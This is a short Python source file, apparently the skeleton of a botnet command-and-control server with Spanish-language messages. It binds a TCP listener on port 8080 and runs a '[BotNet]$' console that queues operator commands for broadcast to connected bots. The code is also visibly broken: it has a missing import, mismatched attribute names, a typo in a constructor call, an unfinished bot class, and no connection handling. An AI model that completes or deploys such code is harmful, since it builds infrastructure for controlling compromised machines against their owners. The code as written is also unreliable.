import socket
import os
import queue
import threading
threads = []
contador = 1
principalQueue = queue.Queue()
class  serverThread(threading.Thread):
    def __init__(self,queueServer):
        threading.Thread.__init__(self,name='Server')
        self.principalQueue = queueServer

    def run(self):
        while True:
            consoleSnd = input('[BotNet]$ ')
            if(consoleSnd == ""):
                pass
            elif(consoleSnd == "exit"):
                for i in range(len(threads)):
                    self.queueServer.put(consoleSnd)
                    time.sleep(1)
                os._exit(0)
            else:
                print('[+] Enviando comando ::{}:: a {} bots'.format(consoleSnd,str(len(threads))))
                for i in range(len(threads)):
                    time.sleep(1);
                    self.queueServer.put(consoleSnd)

class botThread(threading.Thread):
    def __init__(self,bot,botAddress,queue):
        botName = "Bot#"+str(contador)
        threading.Thread__init__(self,name="")

def handler(port,host,queue):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverAddress = (host,port)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    server.bind(serverAddress)
    server.listen(10)
    print("[+]Conexion bot/servidor establecida por TCP::{}:{}\n".format(host,str(port)));

    cmdServer = serverThread(queue);
    cmdServer.start()

def main():
    localPort = 8080
    localAddress = '0.0.0.0'
    try:
        handler(localPort,localAddress,principalQueue)
    except Exception as ex:
        print("\nError al tratar de vincular::{}\n".format(str(ex)))

if __name__ == '__main__':
    main()


